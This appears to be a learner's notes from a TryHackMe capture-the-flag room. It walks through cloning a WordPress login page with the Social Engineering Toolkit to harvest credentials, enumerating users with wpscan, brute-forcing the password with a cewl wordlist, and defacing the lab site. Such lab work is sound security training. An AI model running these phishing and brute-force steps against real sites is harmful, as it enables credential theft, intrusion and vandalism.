- https://tryhackme.com/room/cyberweek2021

phishing attack and hack a Wordpress Content Management System

- defacing a website

Start Machine

```
echo "10.10.63.57 repairshop.sbrc" >> /etc/hosts
echo "127.0.0.1 fonts.googleapis.com" >> /etc/hosts

```

Often hackers will create fake emails pretending to be a bank or online retailer asking users to click on a link and log into their account. The link will lead to a website that looks just like the genuine one but it's actually a fake, owned by the hacker and used to simply trick the victim into giving up their user credentials.

clone a website and create your own spoofed version using a tool called the Social Engineering Toolkit.

- https://github.com/trustedsec/social-engineer-toolkit

```
http://repairshop.sbrc

sed -i 's/WEB_PORT=80/WEB_PORT=100/g' /etc/setoolkit/set.config

settoolkit 

2 = Penetration Testing (Fast Track)/ 1= Microsoft SQL Bruter

1 = Social Engineering Attack
	2 = website attack vectors
		3 = credential harvester attack method
			2 = site cloner

127.0.0.1
http://repairshop.sbrc/wp-login.php

IF success = browser: 127.0.0.1:100 (see a Wordpress logo and signin)
type in random username and password

it captured:
fake@fake.com 
pwd= w0rdpr3ss

next step would be a phishing attack to get target to click on link
```

The only surefire way to make sure the website that we've been linked to is safe is to inspect the URL carefully, which can be difficult. A better idea is not to rely on links that have been sent to you but instead navigate to the site independently. So if you get an email from a service provider saying to login, access the site through a google search instead.

Wordpress vulnerabilities:

- human error = weak passwords, susceptible to social engineering
- vulnerabilities in software = out of date software
- wordpress plugins

hacker would try to see if `/wp-login.php` exists

```
repairshop.sbrc/?page_id=24   when clicked contact

phone number 08081 570087
```

  
When enumerating Wordpress, hackers will often use a tool called [wpscan](https://wpscan.com/wordpress-security-scanner). This tool enumerates a variety of things on a Wordpress site, including users, plugins, version numbers, themes, and many more.

```
wpscan --url http://repairshop.sbrc --no-update -e u

user found: theo

time to get a password, this is a IT company so not likely default password
ise cewl to scan for possible passwords

cewl http://repairshop.sbrc > wordlist

wpscan --url http://repairshop.sbrc -U theo -P wordlist

[SUCCESS] theo / Inverkeithing

http://repairshop.sbrc/wp-login.php
theo / Inverkeithing

Dashboard > Pages > Home -edit
YOU BEEN HACKED! 
HACKED BY --

10.10.63.57:9999

flag: SBRC{ODhiOTQ3ZTk0NzJhMWI1NTE5MGUyY2Vj}

```